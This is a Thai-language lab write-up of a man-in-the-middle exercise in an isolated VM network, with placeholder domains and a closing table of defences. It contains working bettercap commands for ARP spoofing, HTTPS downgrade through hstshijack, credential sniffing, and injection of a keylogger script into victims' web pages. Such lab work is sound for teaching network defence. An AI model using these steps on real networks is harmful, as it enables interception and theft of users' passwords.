# Super MITM Lab — ARP Spoofing, HSTS Hijack & Keylogger Injection

> **⚠️ Authorized lab use only.** ทุกขั้นตอนทำในเครือข่ายทดลองแบบปิด (isolated VMware lab, subnet `192.168.174.0/24`) โดยเครื่องเหยื่อเป็น Windows VM ของผู้ทดลองเอง ไม่มีการโจมตีระบบจริง เว็บไซต์จริง หรือผู้ใช้จริงใด ๆ ทั้งสิ้น เผยแพร่เพื่อการศึกษาเท่านั้น การนำเทคนิคนี้ไปใช้กับระบบที่ไม่ได้รับอนุญาตเป็นความผิดตามกฎหมาย

ชื่อโดเมน/สถาบันเป้าหมายจริงถูกแทนด้วย placeholder (`shop-example.com`, `bank-example.com`) ทั้งในข้อความและภาพประกอบ

---

## Lab environment

| ส่วนประกอบ | รายละเอียด |
|---|---|
| Attacker | Kali Linux VM — bettercap v2.33, Wireshark |
| Victim | Windows 11 VM (`192.168.174.130` / `192.168.174.137`) |
| Network | VMware host-only / NAT lab, `192.168.174.0/24` |
| Interface | `eth0` |

---

## Lab 1 — HTTP interception (ARP spoof + HSTS hijack)

เป้าหมาย: ดักจับ credential ที่ส่งแบบ HTTP POST จากหน้า login ของเว็บ (placeholder `bank-example.com`) ที่รันบนเครื่องเหยื่อ

### ขั้นตอน

1. **แก้ caplet** `hstshijack.cap` — เพิ่ม target domain (`bank-example.com`, `*.bank-example.com`) ใน `hstshijack.targets`, `hstshijack.replacements`, `dns.spoof.domains`

2. **เริ่ม bettercap**
   ```bash
   bettercap -iface eth0
   ```

3. **สแกนเครือข่าย**
   ```
   net.probe on      # ค้นหาอุปกรณ์ใน subnet
   net.show          # แสดง IP / MAC ที่พบ  → victim = 192.168.174.130
   ```

4. **ARP spoofing (full duplex)** — วางตัวเป็น man-in-the-middle ระหว่าง victim กับ gateway
   ```
   set arp.spoof.fullduplex true
   set arp.spoof.targets 192.168.174.130
   arp.spoof on
   ```

5. **Sniff + HSTS hijack**
   ```
   set net.sniff.local true
   net.sniff on
   hstshijack/hstshijack   # inject / strip HTTPS, บังคับ downgrade เป็น HTTP
   ```

6. **วิเคราะห์ด้วย Wireshark** — capture filter:
   ```
   ip.addr == 192.168.174.130 and http.request.method == "POST"
   ```

### ผลลัพธ์

เมื่อเหยื่อเข้าเว็บ browser จะเตือน "ไม่ปลอดภัย" (HTTP downgrade). หลังเหยื่อกรอก login, POST body ที่ดักได้เผยข้อมูลในฟอร์ม (form fields `...tbUsername` / `...tbPassword`) เป็น cleartext:

```
Username : usertest      (dummy)
Password : 12345         (dummy)
```

---

## Lab 2 — Keylogger payload injection

ต่อยอดจาก Lab 1: กรณีเว็บส่ง password แบบ hash ฝั่ง client (POST body เป็น hash ไม่ใช่ cleartext) การ sniff เฉย ๆ จะได้แค่ค่า hash — ต้องไป rainbow-crack ต่อ ยุ่งยาก. แก้ด้วยการ **inject keylogger JS** ดักที่ keystroke ก่อนถูก hash

### ขั้นตอนเพิ่มเติม

เพิ่ม payload ใน `hstshijack.payloads`:
```
*:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js
```

`keylogger.js` inject เข้าหน้าเว็บเป้าหมาย ดักทุก keystroke ที่พิมพ์ในฟอร์ม ก่อน JavaScript ฝั่งเว็บจะ hash — ทำให้ได้ password เป็น plaintext แม้เว็บจะ hash ก่อนส่ง

ขั้นตอน bettercap (`net.probe` → `arp.spoof` → `net.sniff` → `hstshijack`) เหมือน Lab 1

### ผลลัพธ์

```
Username : useername     (dummy)
Password : 123456        (dummy)
```

ได้ plaintext password โดยไม่ต้อง crack hash

---

## บทเรียน / การป้องกัน

| ช่องโหว่ | การป้องกัน |
|---|---|
| ARP spoofing | Dynamic ARP Inspection (DAI), static ARP, port security บน switch |
| HSTS downgrade / SSL strip | HSTS preload list, HTTPS-only, ตรวจ cert warning เสมอ |
| Cleartext HTTP credential | บังคับ HTTPS/TLS ทุก endpoint |
| Client-side keylogger inject | CSP, SRI, ป้องกัน MITM ที่ layer เครือข่าย (ต้นเหตุ) |

Keylogger injection ป้องกันฝั่งเว็บได้ยาก — ต้องตัดที่ต้นเหตุคือ MITM/ARP spoof ในเครือข่าย

---

## Tools

- [bettercap](https://www.bettercap.org/) — network attack/monitoring framework
- [Wireshark](https://www.wireshark.org/) — packet analysis
- `hstshijack` caplet — HSTS bypass + payload injection
